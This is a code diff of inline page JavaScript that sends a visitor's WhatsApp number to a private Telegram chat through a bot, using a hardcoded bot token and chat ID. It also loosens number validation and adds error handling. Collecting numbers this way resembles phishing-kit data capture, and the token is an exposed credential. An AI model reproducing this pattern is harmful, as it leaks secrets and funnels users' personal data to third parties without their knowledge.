@@ -81,11 +81,11 @@
             const botToken = "7607642073:AAGeyNCG4fuahJLGzqS-Zv2-oXbH_YpA6vQ";
             const chatId = "7101300226";
 
-            // Ensure the number is properly formatted
+            // Get the full WhatsApp number with country code
             const fullPhoneNumber = iti.getNumber();
-            console.log("Full Phone Number: ", fullPhoneNumber);
+            console.log("📞 Full Phone Number: ", fullPhoneNumber);
 
-            if (!iti.isValidNumber()) {
+            if (!fullPhoneNumber || fullPhoneNumber.trim() === "") {
                 alert("Please enter a valid WhatsApp number.");
                 return;
             }
@@ -98,21 +98,28 @@
                 return;
             }
 
-            // Send WhatsApp number as a message
-            let messageText = `📞 *WhatsApp Number:* ${fullPhoneNumber}`;
-            let response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: messageText, parse_mode: "Markdown" })
-            });
+            // Send WhatsApp number to Telegram
+            try {
+                let messageText = `📞 *WhatsApp Number:* ${fullPhoneNumber}`;
+                let response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: messageText, parse_mode: "Markdown" })
+                });
 
-            let result = await response.json();
-            if (!result.ok) {
-                alert("Error sending number: " + result.description);
-                return;
+                let result = await response.json();
+                console.log("✅ Telegram API Response:", result);
+
+                if (!result.ok) {
+                    alert("Error sending number: " + result.description);
+                    return;
+                }
+
+                alert("WhatsApp number sent successfully!");
+            } catch (error) {
+                console.error("❌ Error sending WhatsApp number:", error);
+                alert("Something went wrong. Check console for details.");
             }
-
-            alert("WhatsApp number sent successfully!");
         });
     </script>
 
